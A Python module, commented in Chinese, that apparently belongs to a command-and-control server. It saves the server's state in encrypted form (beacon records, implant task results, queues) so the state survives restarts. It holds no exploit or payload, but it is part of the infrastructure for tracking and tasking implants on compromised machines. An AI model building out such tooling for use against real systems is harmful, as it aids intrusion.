"""C2 运行态加密落盘(2026-09-28)。

目的:server 重启后 **beacon↔记录对应关系、任务结果、待办队列、在途登记** 不丢。
(此前全在内存,重启即丢:植入物复用自己生成的随机 id,所以重启后后端"认不出"旧
beacon、历史结果也没了。)

· 密码学:复用 core/crypto.seal / open_sealed(ChaCha20 + HMAC-SHA256, encrypt-then-
  MAC, 每次随机 nonce, 纯标准库 —— 无新依赖, 不用重建镜像)
· 密钥:config.json 的 state_key(首次自动生成 64 位 hex 并原子写回)
· 文件:<配置目录>/data/c2_state.enc(0600;.gitignore 已忽略 c2_server/data/)
· 写盘:状态变更 → 置脏 → 200ms 合并 → 原子写(tmp + os.replace);正常退出再 flush 一次
· 失败策略:解密 / MAC 失败 → 抛错并把原文件改名 .bak,**绝不静默清库**;
  加载失败时 server 照常启动(空状态 + 明确告警),不覆盖磁盘上的坏文件
· 瞬态不落盘:active(活跃会话计数)、running_tasks(植入物每次注册都会重报)——
  见 ClientManager._PERSIST_FIELDS
"""
from __future__ import annotations

import json
import os
import threading
import time
from typing import Callable, Optional

from server.core.crypto import open_sealed, seal
from server.core.log import get_logger

logger = get_logger("state_store")


class StateError(RuntimeError):
    """状态文件读写/加解密错误。"""


def _atomic_write(path: str, data: bytes, mode: int = 0o600) -> None:
    """原子写:同目录临时文件 + os.replace(避免半截文件)。"""
    os.makedirs(os.path.dirname(os.path.abspath(path)) or ".", exist_ok=True)
    tmp = path + ".tmp"
    fd = os.open(tmp, os.O_WRONLY | os.O_CREAT | os.O_TRUNC, mode)
    try:
        with os.fdopen(fd, "wb") as f:
            f.write(data)
    except Exception:
        try:
            os.unlink(tmp)
        except OSError:
            pass
        raise
    os.replace(tmp, path)


def ensure_state_key(config) -> bytes:
    """取/生成运行态落盘密钥(config.json 的 state_key)。

    与 _ensure_implant_key 同思路:缺失就生成 64 位 hex 并原子写回配置文件;
    写回失败不致命(内存里仍可用), 只是重启后会换新密钥 → 旧状态读不出来。
    """
    key_hex = str(getattr(config, "state_key", "") or "")
    if len(key_hex) == 64:
        try:
            return bytes.fromhex(key_hex)
        except ValueError:
            logger.warning("state_key 非法 hex, 重新生成")

    import secrets
    key_hex = secrets.token_hex(32)
    config.state_key = key_hex
    cfg_path = getattr(config, "config_path", "") or (
        os.path.join(config.base_dir, "config.json") if getattr(config, "base_dir", "") else "")
    if cfg_path:
        try:
            with open(cfg_path, "r", encoding="utf-8") as f:
                raw = json.load(f)
            raw["state_key"] = key_hex
            _atomic_write(cfg_path, json.dumps(raw, indent=2, ensure_ascii=False).encode("utf-8"))
            logger.info("state_key 已生成并写入 %s", cfg_path)
        except Exception as exc:
            logger.warning("state_key 写回失败(%s);本次仅内存生效", exc)
    else:
        logger.warning("未取到配置文件路径, state_key 仅内存生效")
    return bytes.fromhex(key_hex)


class StateStore:
    """加密状态文件读写(load/save 全量)。"""

    def __init__(self, path: str, master: bytes):
        self.path = path
        self._master = master

    def load(self) -> dict:
        try:
            with open(self.path, "rb") as f:
                blob = f.read()
        except FileNotFoundError:
            return {}
        except OSError as exc:
            raise StateError(f"读状态文件失败: {exc}") from exc
        if not blob:
            return {}
        try:
            data = json.loads(open_sealed(blob, self._master).decode("utf-8"))
        except Exception as exc:
            bak = f"{self.path}.bak-{int(time.time())}"
            try:
                os.replace(self.path, bak)
            except OSError:
                bak = "(改名失败)"
            raise StateError(f"状态文件解密/解析失败({exc});原文件已留为 {bak}") from exc
        return data if isinstance(data, dict) else {}

    def save(self, data: dict) -> None:
        blob = seal(json.dumps(data, ensure_ascii=False).encode("utf-8"), self._master)
        _atomic_write(self.path, blob, mode=0o600)


class StatePersister:
    """把 mgr / tq / inflight 的运行态按需(200ms 合并)加密写盘, 并可启动时灌回。

    用法(server.py):
        p = StatePersister(store, mgr, tq, inflight)
        p.load()        # 启动恢复(在 attach 之前, 免得恢复动作把状态标脏)
        p.attach()      # 接上变更回调
        p.start() / p.flush() / p.stop()
    """

    DEBOUNCE = 0.2          # 合并窗口(秒)

    def __init__(self, store: StateStore, mgr, tq, inflight=None,
                 log: Optional[Callable[[str], None]] = None):
        self._store = store
        self._mgr = mgr
        self._tq = tq
        self._inflight = inflight
        self._log = log or (lambda msg: logger.info("%s", msg))
        self._dirty = False
        self._first_dirty = 0.0
        self._save_lock = threading.Lock()
        self._evt = threading.Event()
        self._stop = threading.Event()
        self._thread: Optional[threading.Thread] = None
        self._start_lock = threading.Lock()
        self._fail_log_at = 0.0

    # ── 变更标记 ──

    def mark_dirty(self) -> None:
        self._dirty = True
        if not self._first_dirty:
            self._first_dirty = time.monotonic()
        self._evt.set()

    def attach(self) -> None:
        """把 _dirty 回调挂到被持久化的三个对象上。"""
        self._mgr._on_change = self.mark_dirty
        if self._tq is not None:
            self._tq._on_change = self.mark_dirty
        if self._inflight is not None:
            self._inflight._on_change = self.mark_dirty

    # ── 读写 ──

    def load(self) -> tuple:
        """启动恢复。返回 (ok, 说明)。失败不抛异常 —— 服务必须能起来。"""
        try:
            data = self._store.load()
        except StateError as exc:
            self._log(f"[state] 读取失败, 以空状态启动: {exc}")
            return False, str(exc)
        except Exception as exc:      # pragma: no cover - 兜底
            self._log(f"[state] 读取异常, 以空状态启动: {exc}")
            return False, str(exc)
        n_rec = self._mgr.apply_snapshot(data.get("beacons") or {})
        n_task = self._tq.apply_snapshot(data.get("tasks") or {}) if self._tq else 0
        n_inf = (self._inflight.apply_snapshot(data.get("inflight") or {})
                 if self._inflight else 0)
        if n_rec or n_task or n_inf:
            self._log(f"[state] 已恢复 {n_rec} 个 beacon 记录 / {n_task} 个待办任务 / "
                      f"{n_inf} 个在途登记(来自 {self._store.path})")
        return True, f"{n_rec}/{n_task}/{n_inf}"

    def snapshot(self) -> dict:
        data: dict = {"version": 1, "beacons": self._mgr.snapshot()}
        if self._tq is not None:
            data["tasks"] = self._tq.snapshot()
        if self._inflight is not None:
            data["inflight"] = self._inflight.snapshot()
        return data

    def flush(self) -> bool:
        """立即写盘(退出 / 测试用)。返回是否成功。"""
        with self._save_lock:
            self._dirty = False
            self._first_dirty = 0.0
            try:
                self._store.save(self.snapshot())
                return True
            except Exception as exc:
                now = time.monotonic()
                if now - self._fail_log_at > 60:      # 限流: 别把日志刷爆
                    self._fail_log_at = now
                    self._log(f"[state] 写盘失败: {exc}")
                return False

    # ── 后台合并线程 ──

    def _loop(self) -> None:
        while not self._stop.is_set():
            self._evt.wait(0.5)
            self._evt.clear()
            if not self._dirty:
                continue
            wait = self.DEBOUNCE - (time.monotonic() - self._first_dirty)
            if wait > 0:
                time.sleep(wait)
            self.flush()

    def start(self) -> None:
        with self._start_lock:
            if self._thread is not None:
                return
            # 先 start 再挂到 self._thread:避免"对象已挂上但线程还没启动"的窗口 ——
            # 那个窗口里若并发走到 stop(),join() 会抛
            # RuntimeError: cannot join thread before it is started(2026-09-28 实测踩到,
            # 表现:面板输入 exit 直接报错、server.stop() 半途中断)
            thread = threading.Thread(target=self._loop, name="state-persist",
                                      daemon=True)
            thread.start()
            self._thread = thread

    def stop(self) -> None:
        """停线程 + 最后一次 flush。**有竞态/异常也不许把它抛给调用方** ——
        这是 server.stop() 的收尾步骤,不得让关停半途中断。"""
        self._stop.set()
        self._evt.set()
        with self._start_lock:
            thread, self._thread = self._thread, None
        if thread is not None and thread.ident is not None:
            try:
                thread.join(timeout=2)
            except RuntimeError:      # 兜底:理论上 ident 已挡住
                pass
        try:
            self.flush()
        except Exception as exc:      # noqa: BLE001 - 关停收尾: 只记日志
            logger.error("运行态最后写盘失败(不影响停止): %s", exc)
